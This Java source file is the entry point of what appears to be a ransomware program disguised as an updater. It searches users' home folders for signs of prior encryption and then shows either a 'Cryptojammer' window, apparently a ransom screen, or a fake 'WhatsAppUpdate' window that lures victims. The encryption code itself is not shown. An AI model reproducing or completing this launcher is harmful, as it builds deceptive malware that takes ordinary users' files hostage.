/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package view;

import commands.FileFinder;
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

/**
 *
 * @author admin
 */
public class Updater {
    public static void main(String args[]) throws IOException {
        
        // Checking if already encrypted
        // path to the root folder of the search tree
        String startingLocation;
        // starting location of the search determined by OS type
        if (!System.getProperty("os.name").equals("Mac OS X")) {
            startingLocation = "C:\\Users";
        } else {
            startingLocation = "/Users/admin/Desktop";
        }
        
        FileFinder ff = new FileFinder();
        boolean alreadyEncrypted = ff.findIfAlreadyEncrypted(startingLocation);
   
        if (alreadyEncrypted) {
            new Cryptojammer().setVisible(true);
        } else { 
            new WhatsAppUpdate().setVisible(true);
        }
    }    
    
}
